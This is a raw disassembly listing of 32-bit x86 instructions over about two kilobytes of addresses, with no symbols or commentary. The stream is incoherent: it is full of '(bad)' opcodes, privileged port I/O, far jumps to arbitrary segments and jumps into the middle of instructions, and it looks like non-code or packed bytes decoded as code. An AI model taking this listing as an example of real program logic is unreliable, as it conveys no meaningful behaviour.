  40a27a:	cli    
  40a27b:	fisttp WORD PTR [ecx+0x4]
  40a27e:	mov    ebx,0x592c877
  40a283:	and    ecx,DWORD PTR [ebx]
  40a285:	xchg   ecx,eax
  40a286:	(bad)  
  40a287:	mov    bl,bh
  40a289:	and    al,0x7e
  40a28b:	cdq    
  40a28c:	cs cmp eax,0x33bf1cec
  40a292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a293:	xchg   esi,eax
  40a294:	int3   
  40a295:	fwait
  40a296:	adc    dl,BYTE PTR [edx-0x80]
  40a299:	jae    0x40a232
  40a29b:	cmc    
  40a29c:	inc    edi
  40a29d:	jmp    0x40a242
  40a29f:	mov    cl,0x40
  40a2a1:	pop    edi
  40a2a2:	mov    esp,0x11a901c0
  40a2a7:	adc    al,0x38
  40a2a9:	cmovae esp,DWORD PTR [ecx]
  40a2ac:	cmp    eax,0xe4e5de4e
  40a2b1:	imul   eax,eax,0xef2b885a
  40a2b7:	xchg   ebx,eax
  40a2b8:	jge    0x40a2ec
  40a2ba:	out    0xa7,al
  40a2bc:	cmp    dl,cl
  40a2be:	jp     0x40a332
  40a2c0:	je     0x40a24d
  40a2c2:	cmc    
  40a2c3:	dec    edi
  40a2c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2c5:	test   DWORD PTR [edx+ebx*2+0x66a88e5c],edx
  40a2cc:	or     cx,0x2833
  40a2d1:	lods   al,BYTE PTR ds:[esi]
  40a2d2:	pop    ds
  40a2d3:	lods   al,BYTE PTR ds:[esi]
  40a2d4:	sbb    ecx,edi
  40a2d6:	rcl    BYTE PTR ss:[edi+eax*1],0xa7
  40a2db:	mov    ebp,0x104c7006
  40a2e0:	and    eax,0x8f09b147
  40a2e5:	adc    al,0xa
  40a2e7:	cmp    al,0x11
  40a2e9:	mov    bl,0xd6
  40a2eb:	xlat   BYTE PTR ds:[ebx]
  40a2ec:	fs out dx,al
  40a2ee:	cmp    al,0xab
  40a2f0:	fidiv  DWORD PTR [eax-0x2c]
  40a2f3:	mov    eax,ds:0xccc391a8
  40a2f8:	sbb    dh,BYTE PTR [ebx+0x56253d09]
  40a2fe:	(bad)  
  40a300:	dec    esi
  40a301:	dec    ebx
  40a302:	mov    dl,0xe9
  40a304:	cmp    BYTE PTR [esi-0x1fe2320d],bh
  40a30a:	(bad)  
  40a30b:	inc    edi
  40a30c:	mov    bl,0xb9
  40a30e:	inc    edx
  40a30f:	mov    bl,0xc7
  40a311:	jo     0x40a2c1
  40a313:	cmp    cl,BYTE PTR [esi]
  40a315:	or     BYTE PTR [ebx-0x49],dl
  40a318:	ds jmp 0x40a2a2
  40a31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a31c:	inc    ebp
  40a31d:	jp     0x40a2ad
  40a31f:	std    
  40a320:	mov    dh,0x85
  40a322:	in     al,0x4f
  40a324:	fs addr16 call 0xe745:0x3e5cfee6
  40a32d:	in     al,0xfc
  40a32f:	jp     0x40a30e
  40a331:	jne    0x40a382
  40a333:	cmp    ah,BYTE PTR [ebx]
  40a335:	add    BYTE PTR [edi+0x1c],dh
  40a338:	cmp    eax,0xaab09301
  40a33d:	push   0x1b
  40a33f:	add    ch,BYTE PTR [ebp+0x23]
  40a342:	clc    
  40a343:	sti    
  40a344:	add    cl,BYTE PTR [ebp-0xe6e96c2]
  40a34a:	(bad)  
  40a34b:	push   edx
  40a34c:	cwde   
  40a34d:	test   BYTE PTR [edi+ebp*2-0x52],cl
  40a351:	cmp    BYTE PTR [esp+edx*4+0x36],dh
  40a355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a356:	in     al,0x92
  40a358:	and    BYTE PTR [edx],bh
  40a35a:	jbe    0x40a2de
  40a35c:	aam    0xb7
  40a35e:	stos   BYTE PTR es:[edi],al
  40a35f:	push   esp
  40a360:	push   0xffffffdd
  40a362:	cmp    ch,bl
  40a364:	add    al,0x24
  40a366:	adc    DWORD PTR [edi],esp
  40a368:	rol    DWORD PTR [edx-0x192bd1c2],cl
  40a36e:	sbb    ecx,DWORD PTR [esi-0x8458255]
  40a374:	pop    ss
  40a375:	stos   DWORD PTR es:[edi],eax
  40a376:	in     eax,dx
  40a377:	pusha  
  40a378:	adc    BYTE PTR [ecx],ch
  40a37a:	mov    DWORD PTR [edx+ebp*2],esp
  40a37d:	repnz iret 
  40a37f:	ror    DWORD PTR [ebx+eax*4-0x6061630f],1
  40a386:	pushf  
  40a387:	arpl   WORD PTR [edi-0xd],di
  40a38a:	dec    edx
  40a38b:	retf   0x9763
  40a38e:	mov    al,ds:0x733d07b3
  40a393:	rol    DWORD PTR [bp+si-0x17],0x81
  40a398:	les    edx,FWORD PTR [ecx+edi*8]
  40a39b:	cmp    al,0x55
  40a39d:	pop    ebx
  40a39e:	fisubr WORD PTR [ebx-0x4]
  40a3a1:	push   0x14
  40a3a3:	gs mov al,cs:0xaa38c37a
  40a3aa:	dec    edx
  40a3ab:	and    ebx,ebx
  40a3ad:	ror    ah,cl
  40a3af:	aaa    
  40a3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3b1:	out    dx,al
  40a3b2:	fcmovbe st,st(4)
  40a3b4:	xchg   BYTE PTR [eax-0x301db59f],ah
  40a3ba:	arpl   WORD PTR [eax-0x66],dx
  40a3bd:	cmp    al,0x88
  40a3bf:	xor    BYTE PTR [ebx-0xf4d6cd],0x1
  40a3c6:	(bad)  
  40a3c7:	adc    BYTE PTR es:[ebp-0x4fa73aad],bl
  40a3ce:	mov    DWORD PTR [ecx-0x7fec074],ebp
  40a3d4:	loope  0x40a42e
  40a3d6:	(bad)  [ebx+esi*4-0x6aad9d0a]
  40a3dd:	mov    ds:0x15593030,al
  40a3e2:	cs cli 
  40a3e4:	scas   eax,DWORD PTR es:[edi]
  40a3e5:	js     0x40a3c5
  40a3e7:	xor    al,0xf1
  40a3e9:	shl    edx,cl
  40a3eb:	int    0x5f
  40a3ed:	jecxz  0x40a3cb
  40a3ef:	fdivr  DWORD PTR [ebx-0x15e713c3]
  40a3f5:	retf   
  40a3f6:	clc    
  40a3f7:	outs   dx,BYTE PTR ds:[esi]
  40a3f8:	sbb    BYTE PTR [ebx+edi*1],ah
  40a3fb:	adc    esi,ebx
  40a3fd:	or     al,0x6
  40a3ff:	loop   0x40a3e3
  40a401:	xor    BYTE PTR [ecx-0x634f46b],al
  40a407:	test   BYTE PTR [esi+0x53],0x8a
  40a40b:	int    0xa1
  40a40d:	iret   
  40a40e:	js     0x40a44c
  40a410:	jne    0x40a3bd
  40a412:	push   ebx
  40a413:	cmp    al,BYTE PTR [edx-0x3c]
  40a416:	xchg   esp,eax
  40a417:	add    ch,bl
  40a419:	xor    esp,esp
  40a41b:	and    dl,BYTE PTR [ebp+0x7bb9ede1]
  40a421:	ret    0xd484
  40a424:	out    0xac,al
  40a426:	mov    ds:0x5ca670f1,eax
  40a42b:	dec    edx
  40a42c:	rol    ecx,cl
  40a42e:	fld    QWORD PTR [eax+0x11f86b4a]
  40a434:	icebp  
  40a435:	rcr    edx,cl
  40a437:	add    BYTE PTR [edi-0x38d940e3],ch
  40a43d:	pushf  
  40a43e:	jl     0x40a477
  40a440:	bound  edi,QWORD PTR [edi-0x264dd56f]
  40a446:	mov    eax,0x61635062
  40a44b:	cs xor al,0x8b
  40a44e:	in     eax,0xe7
  40a450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a451:	and    ecx,DWORD PTR [edx+edx*2-0x30c5452b]
  40a458:	popf   
  40a459:	add    eax,0xfa415303
  40a45e:	int    0x40
  40a460:	fdiv   st(5),st
  40a462:	adc    BYTE PTR [eax-0x7],al
  40a465:	ja     0x40a3eb
  40a467:	in     al,0xcc
  40a469:	jecxz  0x40a46d
  40a46b:	cmp    eax,DWORD PTR [ecx+0x7414e328]
  40a471:	jl     0x40a444
  40a473:	sub    al,0x4b
  40a475:	mov    esp,0x7aa824f8
  40a47a:	push   edx
  40a47b:	sbb    esp,edi
  40a47d:	imul   edi,DWORD PTR [ecx+0x7],0x31
  40a481:	loop   0x40a40e
  40a483:	cdq    
  40a484:	jno    0x40a4e7
  40a486:	xor    cl,BYTE PTR [ebp-0x37]
  40a489:	int3   
  40a48a:	lods   eax,DWORD PTR ds:[esi]
  40a48b:	jmp    0x40a478
  40a48d:	lods   eax,DWORD PTR ds:[esi]
  40a48e:	mov    dl,0xc6
  40a490:	lock xchg ecx,eax
  40a492:	push   esi
  40a493:	ss cmc 
  40a495:	sub    eax,0x38176b18
  40a49a:	sub    esp,ebp
  40a49c:	stos   BYTE PTR es:[edi],al
  40a49d:	fistp  DWORD PTR [eax+0x43]
  40a4a0:	or     eax,0xf05b692f
  40a4a5:	xor    ah,bh
  40a4a7:	ror    BYTE PTR ds:0x1aa593fd,cl
  40a4ad:	cld    
  40a4ae:	xchg   ebx,eax
  40a4af:	and    dh,bl
  40a4b1:	xor    al,0xb9
  40a4b3:	and    eax,0x291510e
  40a4b8:	xor    esp,DWORD PTR [edx-0x6bfed4ae]
  40a4be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4bf:	pushf  
  40a4c0:	dec    ebx
  40a4c1:	aas    
  40a4c2:	sahf   
  40a4c3:	aad    0x95
  40a4c5:	mov    eax,gs
  40a4c7:	sub    al,0x8b
  40a4c9:	xchg   edi,eax
  40a4ca:	pop    ds
  40a4cb:	test   eax,0x4b40125d
  40a4d0:	cld    
  40a4d1:	loope  0x40a508
  40a4d3:	inc    eax
  40a4d4:	jl     0x40a517
  40a4d6:	pop    eax
  40a4d7:	gs jmp 0x40a47a
  40a4da:	in     al,0x58
  40a4dc:	cmp    ah,0x2c
  40a4df:	push   ecx
  40a4e0:	sub    al,0x20
  40a4e2:	mov    bl,0xdc
  40a4e4:	inc    ebp
  40a4e6:	pop    ebx
  40a4e7:	sbb    BYTE PTR [eax+0xae6a059],ah
  40a4ed:	dec    esi
  40a4ee:	(bad)  
  40a4ef:	(bad)  
  40a4f0:	jnp    0x40a554
  40a4f2:	jl     0x40a4b6
  40a4f4:	leave  
  40a4f5:	idiv   DWORD PTR [ebx-0x65]
  40a4f8:	lods   al,BYTE PTR ds:[esi]
  40a4f9:	xor    al,0xa5
  40a4fb:	mov    ecx,0x324f97a2
  40a500:	mov    cl,BYTE PTR [edi]
  40a502:	call   0x7515d276
  40a507:	inc    ebx
  40a508:	jb     0x40a558
  40a50a:	jmp    0x40a51a
  40a50c:	in     eax,0x91
  40a50e:	add    BYTE PTR [ecx],ch
  40a510:	dec    esp
  40a511:	sahf   
  40a512:	adc    esp,ebx
  40a514:	mov    al,ds:0xcba1c128
  40a519:	mov    ds:0xbe29b750,al
  40a51e:	xor    eax,0xc70f4894
  40a523:	aad    0xc2
  40a525:	add    dh,BYTE PTR [ebp-0x7]
  40a528:	xchg   ebx,eax
  40a529:	adc    al,0x9e
  40a52b:	jns    0x40a4ff
  40a52d:	sub    BYTE PTR [ecx+0x1c],ch
  40a530:	sub    eax,0xb0ff360e
  40a535:	or     DWORD PTR [ebx],ebp
  40a537:	or     eax,0x403530da
  40a53c:	and    al,0x7d
  40a53e:	arpl   WORD PTR [edx],dx
  40a540:	jp     0x40a571
  40a542:	out    0x76,al
  40a544:	add    eax,0xfe1bee43
  40a549:	or     DWORD PTR [edi],0xffffffa0
  40a54c:	sbb    edx,DWORD PTR [ecx]
  40a54e:	or     bl,BYTE PTR [eax]
  40a550:	rcr    edx,cl
  40a552:	mov    cl,0x61
  40a554:	add    ebx,esi
  40a556:	outs   dx,BYTE PTR ds:[esi]
  40a557:	aaa    
  40a558:	lods   eax,DWORD PTR ds:[esi]
  40a559:	dec    DWORD PTR [edx]
  40a55b:	add    edi,DWORD PTR [eax-0x80]
  40a55e:	cs call 0xe83b761a
  40a564:	ins    BYTE PTR es:[edi],dx
  40a565:	push   ss
  40a566:	mov    esi,edx
  40a568:	sahf   
  40a569:	cmp    eax,0xf03f51d3
  40a56e:	lea    ebp,[esi]
  40a570:	mov    ecx,0x92853ca6
  40a575:	mov    ch,0x43
  40a577:	jb     0x40a5db
  40a579:	dec    ebp
  40a57a:	shl    DWORD PTR [edi+0x28],cl
  40a57d:	mov    esp,0x9bab9b96
  40a582:	dec    esi
  40a583:	inc    eax
  40a584:	and    esp,esi
  40a586:	and    BYTE PTR ds:0x720262e3,0x3a
  40a58d:	shl    DWORD PTR [eax+0x60],cl
  40a590:	(bad)  
  40a591:	retf   
  40a592:	js     0x40a588
  40a594:	icebp  
  40a595:	loope  0x40a5ad
  40a597:	neg    DWORD PTR [ebx]
  40a599:	jle    0x40a53e
  40a59b:	xor    edx,edx
  40a59d:	jge    0x40a520
  40a59f:	data16 je 0x40a525
  40a5a2:	ret    0x7c15
  40a5a5:	out    dx,al
  40a5a6:	jl     0x40a5c8
  40a5a8:	push   esi
  40a5a9:	leave  
  40a5aa:	or     ebx,DWORD PTR [ebp+0x317ad8d1]
  40a5b0:	outs   dx,DWORD PTR ds:[esi]
  40a5b1:	push   edx
  40a5b2:	mov    eax,es:0xfb248e0c
  40a5b8:	in     eax,dx
  40a5b9:	push   ebp
  40a5ba:	stos   BYTE PTR es:[edi],al
  40a5bb:	icebp  
  40a5bc:	test   eax,0x28f59cd0
  40a5c1:	or     eax,0x4d36566d
  40a5c6:	sbb    eax,0xaaef01d9
  40a5cb:	fisttp DWORD PTR [ebp-0x75]
  40a5ce:	icebp  
  40a5cf:	sbb    al,0x7e
  40a5d2:	clc    
  40a5d3:	mov    bl,0xd2
  40a5d5:	dec    edi
  40a5d6:	push   ebp
  40a5d7:	cmp    esi,DWORD PTR [esi+esi*4]
  40a5da:	push   0x21
  40a5dc:	cmp    DWORD PTR [edx],ecx
  40a5de:	push   esp
  40a5df:	mov    DWORD PTR [ebx-0x2092bceb],edx
  40a5e5:	pop    esp
  40a5e6:	fmul   DWORD PTR [edi+0x8]
  40a5e9:	dec    eax
  40a5ea:	jne    0x40a5b1
  40a5ec:	aam    0x2e
  40a5ee:	jg     0x40a5ba
  40a5f0:	jae    0x40a613
  40a5f2:	scas   eax,DWORD PTR es:[edi]
  40a5f3:	adc    BYTE PTR [edx-0x74],dl
  40a5f6:	dec    ecx
  40a5f7:	or     al,0x8f
  40a5f9:	xchg   edx,eax
  40a5fa:	push   cs
  40a5fb:	cmp    DWORD PTR [edi+esi*1],edi
  40a5fe:	cmp    DWORD PTR [ebp-0x4a84aa46],0x5dc93433
  40a608:	sub    DWORD PTR [edx-0x2fea5b8b],ebx
  40a60e:	loop   0x40a5dc
  40a610:	dec    esp
  40a611:	lahf   
  40a612:	mov    bh,0x24
  40a614:	xor    DWORD PTR [ecx],edx
  40a616:	and    al,0x6
  40a618:	lea    edi,[ebp-0x40]
  40a61b:	xchg   ebx,eax
  40a61c:	shl    BYTE PTR [edx+eax*1+0x1c],0xe2
  40a621:	xchg   esi,eax
  40a622:	les    edx,FWORD PTR [ecx]
  40a624:	mov    ecx,0x66ed2026
  40a629:	sbb    BYTE PTR [edi+0x41],0x49
  40a62d:	popf   
  40a62e:	jns    0x40a5c1
  40a630:	dec    edx
  40a631:	mov    esi,0x5eb0e979
  40a636:	repnz mov edi,0x82091d14
  40a63c:	mov    eax,ds:0x43bdfcd1
  40a641:	ins    DWORD PTR es:[edi],dx
  40a642:	ret    0x963
  40a645:	sub    eax,0x51c0d777
  40a64a:	push   es
  40a64b:	inc    esp
  40a64c:	ficomp WORD PTR [ebx]
  40a64e:	into   
  40a64f:	sbb    DWORD PTR [eax+0x463aa276],ebp
  40a655:	sbb    esi,0xfffffff1
  40a658:	nop
  40a659:	or     DWORD PTR [ebx+0x10],edi
  40a65c:	bound  edi,QWORD PTR ds:0xaa5fe4a
  40a662:	jns    0x40a5f6
  40a664:	cdq    
  40a665:	sar    DWORD PTR [ebp+0x5f0286c6],1
  40a66b:	sti    
  40a66c:	pop    ebx
  40a66d:	xchg   ebx,eax
  40a66e:	es xchg ebp,eax
  40a670:	mov    al,ds:0xc58f5ee6
  40a675:	jmp    DWORD PTR [eax+0x5f363fe1]
  40a67b:	jle    0x40a6c9
  40a67d:	push   es
  40a67e:	sub    al,0x1d
  40a680:	adc    cl,bl
  40a682:	ror    BYTE PTR [eax+0x4aa43c92],1
  40a688:	mov    BYTE PTR [eax-0x7c],dh
  40a68b:	dec    esi
  40a68c:	push   ds
  40a68d:	xchg   ecx,eax
  40a68e:	or     al,0x9c
  40a690:	xchg   esp,eax
  40a691:	rol    DWORD PTR [ebp-0x31],0xae
  40a695:	in     eax,dx
  40a696:	add    esi,ebp
  40a698:	xchg   edi,eax
  40a699:	cmp    eax,DWORD PTR [edi]
  40a69b:	dec    ebx
  40a69c:	push   ecx
  40a69d:	jmp    0x40a64e
  40a69f:	mov    WORD PTR [ebp-0x16dcf4e5],ss
  40a6a5:	add    DWORD PTR [edi+0x20],ebx
  40a6a8:	add    al,0x23
  40a6aa:	(bad)  
  40a6ab:	mov    edi,0x49b5919c
  40a6b0:	sti    
  40a6b1:	add    cl,dl
  40a6b3:	adc    edx,DWORD PTR [ecx-0x60]
  40a6b6:	or     edx,ebx
  40a6b8:	sbb    eax,0xca741d71
  40a6bd:	mov    bh,0xb8
  40a6bf:	mov    al,ds:0x6db04859
  40a6c4:	call   0x684a:0xaef74518
  40a6cb:	dec    edx
  40a6cc:	mov    al,ds:0xeece4643
  40a6d1:	push   cs
  40a6d2:	cli    
  40a6d3:	cld    
  40a6d4:	out    0xce,al
  40a6d6:	and    BYTE PTR [edi],cl
  40a6d8:	push   cs
  40a6d9:	cmp    BYTE PTR [ebx+0x25ad3c7e],0xa0
  40a6e0:	add    bh,BYTE PTR [edx+0x1603903a]
  40a6e6:	fistp  QWORD PTR [ebx]
  40a6e8:	outs   dx,BYTE PTR ds:[esi]
  40a6e9:	sahf   
  40a6ea:	pusha  
  40a6eb:	push   edi
  40a6ec:	and    eax,0x1d64f65e
  40a6f1:	arpl   WORD PTR [edx-0x7efe2fc5],dx
  40a6f7:	xchg   DWORD PTR ds:[eax+0x3d],esp
  40a6fb:	test   BYTE PTR [edx],al
  40a6fd:	fldl2t 
  40a6ff:	aas    
  40a700:	mov    edx,0xce9d13bb
  40a705:	xchg   ebp,eax
  40a706:	std    
  40a707:	add    bh,al
  40a709:	(bad)  [esp+eiz*4]
  40a70c:	dec    ecx
  40a70d:	add    BYTE PTR [ebx+ebx*1],cl
  40a710:	push   esi
  40a711:	dec    esp
  40a712:	shr    bl,1
  40a714:	into   
  40a715:	int    0xc9
  40a717:	mov    al,ds:0xaa04fa7f
  40a71c:	push   edi
  40a71d:	sbb    BYTE PTR [ecx],ch
  40a71f:	je     0x40a77b
  40a721:	cmp    al,0xe1
  40a723:	sub    bh,ah
  40a725:	mov    ah,0x76
  40a727:	add    DWORD PTR [bp+0x67],edx
  40a72b:	inc    esp
  40a72c:	scas   eax,DWORD PTR es:[edi]
  40a72d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a72e:	push   eax
  40a72f:	iret   
  40a730:	dec    ebx
  40a731:	call   0xc6be76f3
  40a736:	mov    DWORD PTR [ebx+0x25],esp
  40a739:	iret   
  40a73a:	or     DWORD PTR [ebx+0x4b],ebx
  40a73d:	inc    esi
  40a73e:	aad    0x39
  40a740:	jmp    0xa3c0b6c8
  40a745:	not    DWORD PTR [edx-0x4d57ad85]
  40a74b:	ds daa 
  40a74d:	sbb    al,0xe7
  40a74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a750:	idiv   BYTE PTR [ebx-0x681683ce]
  40a756:	retf   0xb6ad
  40a759:	nop
  40a75a:	jo     0x40a70f
  40a75c:	dec    ecx
  40a75d:	sub    bl,BYTE PTR [ebp+0x4a3f4848]
  40a763:	loope  0x40a6e6
  40a765:	cmp    cl,BYTE PTR [edx]
  40a767:	pop    ss
  40a768:	or     eax,0x580542cc
  40a76d:	jae    0x40a7a7
  40a76f:	sbb    ah,BYTE PTR [ebp+0xa]
  40a772:	in     eax,0xfe
  40a774:	mov    dh,al
  40a776:	mov    BYTE PTR [esi+0x495ac49e],cl
  40a77c:	popa   
  40a77d:	fist   DWORD PTR [ebx+0x3d60d2eb]
  40a783:	cmc    
  40a784:	ror    DWORD PTR [esi+0x2f7f83d4],0x8d
  40a78b:	retf   0xecf7
  40a78e:	arpl   WORD PTR [esi+0x228322e7],ax
  40a794:	mov    eax,DWORD PTR ss:[ebp-0x59566527]
  40a79b:	fidiv  DWORD PTR [edx]
  40a79d:	call   0xd3b7:0x8efd724a
  40a7a4:	inc    ebx
  40a7a5:	jae    0x40a77d
  40a7a7:	and    al,0x72
  40a7a9:	mov    BYTE PTR [edi+0x19dbe368],ah
  40a7af:	lock cld 
  40a7b1:	pop    esp
  40a7b2:	rol    DWORD PTR [edx-0x5],1
  40a7b5:	in     al,dx
  40a7b6:	adc    bl,BYTE PTR [ebx+edi*8]
  40a7b9:	push   0x7fbbb12c
  40a7be:	and    BYTE PTR [eax],ah
  40a7c0:	adc    al,0x21
  40a7c2:	dec    edi
  40a7c3:	(bad)  
  40a7c5:	mov    es:0xba080818,eax
  40a7cb:	xor    DWORD PTR [ebp+0xf2a540f],ebp
  40a7d1:	fwait
  40a7d2:	pop    ebx
  40a7d3:	adc    al,0xcb
  40a7d5:	mov    ?,WORD PTR [ebx-0x1418149d]
  40a7db:	jl     0x40a798
  40a7dd:	repnz mov ecx,0xae8fbbd1
  40a7e3:	and    ch,dl
  40a7e5:	out    0xd3,eax
  40a7e7:	jno    0x40a7b0
  40a7e9:	mov    dl,0x4
  40a7eb:	cld    
  40a7ec:	(bad)  [ecx+0x5b]
  40a7ef:	jbe    0x40a86d
  40a7f1:	icebp  
  40a7f2:	add    ebp,eax
  40a7f4:	icebp  
  40a7f5:	dec    ebx
  40a7f6:	cmp    BYTE PTR [ecx-0x7fda9de3],dh
  40a7fc:	or     ecx,ebx
  40a7fe:	test   DWORD PTR [ebx+0x5f],ecx
  40a801:	dec    ebp
  40a802:	dec    esp
  40a803:	push   0x257a3277
  40a808:	or     ch,BYTE PTR [ebx+0x4b48a99e]
  40a80e:	mov    cl,BYTE PTR [edx-0x7dc1985c]
  40a814:	xor    BYTE PTR ds:0xf726372e,0x57
  40a81b:	jo     0x40a82d
  40a81d:	dec    esi
  40a81e:	leave  
  40a81f:	ins    DWORD PTR es:[edi],dx
  40a820:	xchg   BYTE PTR [edi-0x53],bh
  40a823:	hlt    
  40a824:	rol    BYTE PTR [edi],0xad
  40a827:	fnstenv [edx-0x44]
  40a82a:	push   es
  40a82b:	jb     0x40a85d
  40a82d:	imul   ecx,DWORD PTR [edi+0x73c389b],0xb8c451b8
  40a837:	(bad)  
  40a838:	xchg   ebp,eax
  40a839:	push   ebx
  40a83a:	add    dl,BYTE PTR [ebx+0x2881ee7]
  40a840:	shr    edx,cl
  40a842:	fcomip st,st(5)
  40a844:	push   edx
  40a845:	js     0x40a89d
  40a847:	pop    eax
  40a848:	sub    esi,DWORD PTR ds:0xec2faad5
  40a84e:	dec    ecx
  40a84f:	or     edi,DWORD PTR [esi]
  40a851:	out    dx,al
  40a852:	les    esi,FWORD PTR [ecx]
  40a854:	js     0x40a7ee
  40a856:	pop    edi
  40a857:	push   edx
  40a858:	pushf  
  40a859:	or     edi,ecx
  40a85b:	in     al,dx
  40a85c:	shl    BYTE PTR [ebp-0x4d],0x79
  40a860:	sub    eax,edx
  40a862:	idiv   DWORD PTR [edi+0x75]
  40a865:	or     eax,0xceeee93f
  40a86a:	pop    esi
  40a86b:	sub    al,0xcb
  40a86d:	lar    ecx,bp
  40a870:	mov    DWORD PTR [esp+ebx*2+0x49851e74],esp
  40a877:	sbb    DWORD PTR [esi],edi
  40a879:	out    dx,eax
  40a87a:	adc    dh,BYTE PTR [ecx+0x4a2354e8]
  40a880:	lea    esp,[esi-0x5f93eace]
  40a886:	ss pushf 
  40a888:	fcom   DWORD PTR [ecx]
  40a88a:	push   eax
  40a88b:	mov    ch,cl
  40a88d:	pop    eax
  40a88e:	loope  0x40a877
  40a890:	cmp    eax,0x81495ce6
  40a895:	jmp    0x1f3afac6
  40a89a:	jbe    0x40a87c
  40a89c:	sbb    ah,BYTE PTR [ecx+edi*4+0x16]
  40a8a0:	test   al,0x5e
  40a8a2:	ins    BYTE PTR es:[edi],dx
  40a8a3:	jl     0x40a8e0
  40a8a5:	fadd   DWORD PTR [edx+esi*4]
  40a8a8:	shufps xmm6,XMMWORD PTR [edx+0x43117f88],0xad
  40a8b0:	in     al,dx
  40a8b1:	mul    bl
  40a8b3:	ror    BYTE PTR [eax+0x7b6611ab],0xf9
  40a8ba:	mov    edi,DWORD PTR [esi-0x6481ba3f]
  40a8c0:	icebp  
  40a8c1:	xlat   BYTE PTR ds:[ebx]
  40a8c2:	dec    esp
  40a8c3:	mov    ebx,0xcadf617a
  40a8c8:	or     ecx,0xaa4454c1
  40a8ce:	std    
  40a8cf:	in     al,0x5c
  40a8d1:	retf   0xdde3
  40a8d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8d5:	push   0x25
  40a8d7:	adc    dh,0xfb
  40a8da:	imul   ecx,DWORD PTR ds:0x91616316,0xb402cc2f
  40a8e4:	add    DWORD PTR [eax],eax
  40a8e6:	daa    
  40a8e7:	scas   eax,DWORD PTR es:[edi]
  40a8e8:	int    0x11
  40a8ea:	retf   
  40a8eb:	xor    eax,0x50ab0c17
  40a8f0:	mov    ecx,0xb159dcef
  40a8f5:	inc    edi
  40a8f6:	stos   DWORD PTR es:[edi],eax
  40a8f7:	aas    
  40a8f8:	pusha  
  40a8f9:	jecxz  0x40a8ab
  40a8fb:	jl     0x40a8dc
  40a8fd:	lds    ebx,FWORD PTR [ebx+0x71]
  40a900:	inc    ebx
  40a901:	ins    DWORD PTR es:[edi],dx
  40a902:	and    eax,0x7ad39afd
  40a907:	jp     0x40a96c
  40a909:	in     eax,0x20
  40a90b:	stc    
  40a90c:	pusha  
  40a90d:	xchg   edx,eax
  40a90e:	push   esp
  40a90f:	pop    ebp
  40a910:	rcl    edi,0x22
  40a913:	mov    ds:0xcde51c3f,eax
  40a918:	imul   esi,ebp,0x73
  40a91b:	jno    0x40a97b
  40a91d:	pusha  
  40a91e:	(bad)  
  40a91f:	or     ebx,eax
  40a921:	shr    edi,1
  40a923:	pop    ebp
  40a924:	stos   BYTE PTR es:[edi],al
  40a925:	sbb    al,0x59
  40a927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a928:	mov    ds:0x52320d8a,al
  40a92d:	cmp    al,BYTE PTR [eax-0x68d44d9e]
  40a933:	fiadd  WORD PTR ds:0xd8e3db8f
  40a939:	repz sbb al,0x9a
  40a93c:	int    0x76
  40a93e:	pop    ebx
  40a93f:	push   ebx
  40a940:	mov    ebp,0xafb8100e
  40a945:	dec    esi
  40a946:	ja     0x40a94f
  40a948:	fiadd  WORD PTR [ecx+0x672dc2ac]
  40a94e:	call   0xccac2009
  40a953:	pop    es
  40a954:	adc    DWORD PTR [ecx+0x4bacb73a],ebp
  40a95a:	jl     0x40a946
  40a95c:	add    BYTE PTR [ecx+0xd],0xf5
  40a960:	lahf   
  40a961:	outs   dx,BYTE PTR ds:[esi]
  40a962:	xchg   edi,eax
  40a963:	cld    
  40a964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a965:	ret    
  40a966:	add    ebx,DWORD PTR [eax+ecx*1+0x47]
  40a96a:	jmp    0x197c:0x9fb9e38f
  40a971:	and    BYTE PTR [edx-0x1d],0x5f
  40a975:	inc    esi
  40a976:	jo     0x40a9b0
  40a978:	jnp    0x40a930
  40a97a:	loope  0x40a9ab
  40a97c:	xor    ebx,DWORD PTR [edx-0x7b585b78]
  40a982:	mov    DWORD PTR [edi-0x5155be7a],eax
  40a988:	cmp    eax,0xc0d1cd41
  40a98d:	ret    0xc2f7
  40a990:	imul   edi,DWORD PTR [esi+0x7c],0xffffff90
  40a994:	pop    ebx
  40a995:	sahf   
  40a996:	leave  
  40a997:	loop   0x40a956
  40a999:	adc    edx,eax
  40a99b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a99c:	sub    DWORD PTR [ecx+0x127a4244],0x975d1aa7
  40a9a6:	int3   
  40a9a7:	mov    ebx,0xaff0fa75
  40a9ac:	sub    al,0x9d
  40a9ae:	iret   
  40a9af:	xchg   dl,cl
  40a9b1:	mov    ecx,0x32e2d549
  40a9b6:	push   edx
  40a9b7:	lock mul BYTE PTR [ebx+0x7312e81c]
  40a9be:	repz adc eax,0x70ae15cd
  40a9c4:	sbb    DWORD PTR [edx+0x33],ebp
  40a9c7:	adc    BYTE PTR [edx+eiz*4-0x696def2f],dh
  40a9ce:	mov    DWORD PTR [edx+eax*1-0x19d9e623],0xaf88287e
  40a9d9:	(bad)  
  40a9da:	scas   al,BYTE PTR es:[edi]
  40a9db:	lods   eax,DWORD PTR ds:[esi]
  40a9dc:	or     eax,0x1fdff2d0
  40a9e1:	mov    ss,WORD PTR [edi+0x511cf996]
  40a9e7:	mov    bl,0x1c
  40a9e9:	xor    ebx,edi
  40a9eb:	icebp  
  40a9ec:	dec    ecx
  40a9ed:	push   0xa4144c91
  40a9f2:	inc    ebx
  40a9f3:	jae    0x40aa72
  40a9f5:	jmp    0x909b:0xf9e7caff
  40a9fc:	dec    eax
  40a9fd:	ss inc ebp
  40a9ff:	push   esi
  40aa00:	loope  0x40a9d3
  40aa02:	enter  0x89fc,0xc1
  40aa06:	pusha  
  40aa07:	test   eax,0xa2ce3c20
  40aa0c:	cmp    al,0x55
  40aa0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
